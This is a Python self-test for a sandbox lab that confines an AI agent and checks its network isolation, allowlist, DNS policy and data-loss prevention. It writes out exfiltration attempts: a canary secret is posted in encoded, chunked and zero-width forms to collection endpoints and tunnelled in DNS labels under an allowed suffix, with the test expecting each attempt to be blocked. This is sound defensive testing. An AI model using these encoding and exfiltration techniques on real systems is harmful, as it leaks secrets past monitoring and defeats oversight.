"""Self-test: assert the lab actually behaves the way the README claims.

Run from inside the jailed agent, so the network jail is under test too. Exits
non-zero on the first broken expectation, which makes it usable in CI.
"""

from __future__ import annotations

import base64
import binascii
import os
import sys
import time
import urllib.parse

from . import encodings, net, scenarios, tools

FIREWALL_ADMIN = os.environ.get("FIREWALL_ADMIN", "http://172.29.0.20:9090")
DNSGUARD_ADMIN = os.environ.get("DNSGUARD_ADMIN", "http://172.29.0.30:9092")
SECRET = os.environ.get("AGENT_SECRET", "")

PASS, FAIL = [], []


def check(name: str, ok: bool, detail: str = "") -> bool:
    if ok:
        PASS.append(name)
        print("  pass  %-56s %s" % (name, detail[:40]))
    else:
        FAIL.append((name, detail))
        print("  FAIL  %-56s %s" % (name, detail[:120]))
    return ok


def set_mode(mode: str) -> None:
    for base in (FIREWALL_ADMIN, DNSGUARD_ADMIN):
        net.control("%s/mode?m=%s" % (base, mode))
    time.sleep(0.3)


def tag(scenario_id: str) -> None:
    for base in (FIREWALL_ADMIN, DNSGUARD_ADMIN):
        net.control("%s/scenario?s=%s" % (base, urllib.parse.quote(scenario_id)))


def section(title: str) -> None:
    print("\n  " + title)
    print("  " + "-" * 72)


def test_encoders() -> None:
    section("Encoders round-trip")
    secret = "CANARY-abc123-XYZ"
    check(
        "base64 decodes back to the secret",
        base64.b64decode(encodings.b64(secret)).decode() == secret,
    )
    check(
        "hex decodes back to the secret",
        binascii.unhexlify(encodings.hexed(secret)).decode() == secret,
    )
    check("rot13 is its own inverse", encodings.rot13(encodings.rot13(secret)) == secret)
    check("reverse is its own inverse", encodings.reverse(encodings.reverse(secret)) == secret)
    check(
        "base32 decodes back to the secret",
        base64.b32decode(
            encodings.b32(secret).upper() + "=" * (-len(encodings.b32(secret)) % 8)
        ).decode()
        == secret,
    )
    zw = encodings.zero_width(secret)
    check("zero-width payload is visually empty", secret not in zw and len(zw) > len(secret))
    check(
        "chunks reassemble to the original",
        "".join(encodings.chunks(secret, 5)) == secret,
    )


def test_jail() -> None:
    section("Container network isolation")
    resp = net.raw_socket_send(scenarios.ATTACKER_IP, 80, "GET / HTTP/1.0\r\n\r\n", timeout=4)
    check(
        "raw socket to the attacker has no route",
        not resp.ok,
        resp.error,
    )
    resp = net.request("GET", "http://%s/" % scenarios.ATTACKER_IP, use_proxy=False, timeout=5)
    check(
        "direct HTTP to the attacker has no route",
        not resp.ok,
        resp.error,
    )


def test_allowlist() -> None:
    section("Destination allowlist")
    tag("selftest_allowlist")
    resp = net.request("GET", "https://%s/api/status" % scenarios.TRUSTED_HOST)
    check("allowlisted host is reachable through the proxy", resp.ok, resp.short())

    resp = net.request("GET", "https://%s/" % scenarios.ATTACKER_HOST)
    check(
        "non-allowlisted host is refused by the proxy",
        not resp.ok,
        resp.short(),
    )

    resp = net.request("POST", "https://%s/collect" % scenarios.ATTACKER_IP, body="x")
    check("connecting by raw IP is refused", not resp.ok, resp.short())


def test_dns() -> None:
    section("Resolver policy")
    tag("selftest_dns")
    resp = net.dns_lookup(scenarios.TRUSTED_HOST)
    check("allowlisted hostname resolves", resp.ok, resp.body or resp.error)

    resp = net.dns_lookup("anything.%s" % scenarios.ATTACKER_HOST)
    check("attacker zone does not resolve", not resp.ok, resp.error)

    payload = encodings.b32(SECRET)
    label = encodings.dns_labels(payload)[0]
    resp = net.dns_lookup("%s.s-selftest.%s" % (label, scenarios.DNS_SINK_ALLOWED))
    check(
        "data-bearing hostname under an allowed suffix is refused",
        not resp.ok,
        resp.error,
    )


def test_dlp() -> None:
    section("Data-loss prevention on allowed destinations")
    url = "https://%s/collect" % scenarios.DROP_HOST

    cases = [
        ("plaintext secret", "plain"),
        ("base64 secret", "base64"),
        ("hex secret", "hex"),
        ("rot13 secret", "rot13"),
        ("reversed secret", "reverse"),
        ("gzip then base64", "gzip_b64"),
        ("base64 then hex", "nested_b64_hex"),
        ("character codes", "charcode"),
        ("zero-width unicode", "zero_width"),
    ]
    for label, encoding in cases:
        tag("selftest_dlp_%s" % encoding)
        box = tools.Toolbox(scenario_tag="selftest_dlp_%s" % encoding)
        resp = box.http_post(url, encodings.encode(encoding, SECRET))
        check("%s is blocked" % label, not resp.ok, resp.short())

    tag("selftest_dlp_chunks")
    box = tools.Toolbox(scenario_tag="selftest_dlp_chunks")
    parts = encodings.chunks(SECRET, 6)
    outcomes = [box.http_post("%s?part=%d" % (url, i), p, field="fragment")
                for i, p in enumerate(parts)]
    check(
        "secret split across six requests is reassembled and blocked",
        any(not r.ok for r in outcomes),
        "%d of %d requests refused" % (sum(1 for r in outcomes if not r.ok), len(outcomes)),
    )


def test_no_false_positives() -> None:
    section("Legitimate traffic is not disturbed")
    tag("selftest_controls")
    for url in (
        "https://%s/api/status" % scenarios.TRUSTED_HOST,
        "http://%s/api/status" % scenarios.DOCS_HOST,
        "https://%s/" % scenarios.TRUSTED_HOST,
    ):
        resp = net.request("GET", url)
        check("ordinary request succeeds: %s" % url[:46], resp.ok, resp.short())

    box = tools.Toolbox(scenario_tag="selftest_controls")
    resp = box.http_post(
        "https://%s/notes" % scenarios.TRUSTED_HOST,
        "The ingest tier improved by eleven percent this quarter.",
    )
    check("posting innocuous content is allowed", resp.ok, resp.short())


def test_interception() -> None:
    section("TLS interception")
    status = net.get_json(FIREWALL_ADMIN + "/status")
    check("firewall reports interception enabled", bool(status.get("tls_intercept")), str(status.get("mode")))
    check("firewall holds the canary", int(status.get("secrets") or 0) > 0)

    events = net.get_json(FIREWALL_ADMIN + "/events").get("events") or []
    inspected = [e for e in events if e.get("inspected") and e.get("proto") == "https"]
    check(
        "HTTPS requests were decrypted and inspected",
        len(inspected) > 0,
        "%d inspected requests" % len(inspected),
    )
    blocked = [e for e in events if e.get("action") == "block" and str(e.get("reason", "")).startswith("dlp")]
    check("DLP recorded blocks in the audit log", len(blocked) > 0, "%d dlp blocks" % len(blocked))


def main() -> int:
    if not SECRET:
        print("AGENT_SECRET is not set", file=sys.stderr)
        return 2

    print()
    print("  EGRESS LAB SELF-TEST")
    print("  " + "=" * 72)
    set_mode("full")
    net.reload_trust()

    test_encoders()
    test_jail()
    test_allowlist()
    test_dns()
    test_dlp()
    test_no_false_positives()
    test_interception()

    print()
    print("  " + "=" * 72)
    print("  %d passed, %d failed" % (len(PASS), len(FAIL)))
    if FAIL:
        print()
        for name, detail in FAIL:
            print("  FAILED: %s" % name)
            if detail:
                print("          %s" % detail[:200])
        print()
        return 1
    print("  The lab behaves as documented.")
    print()
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
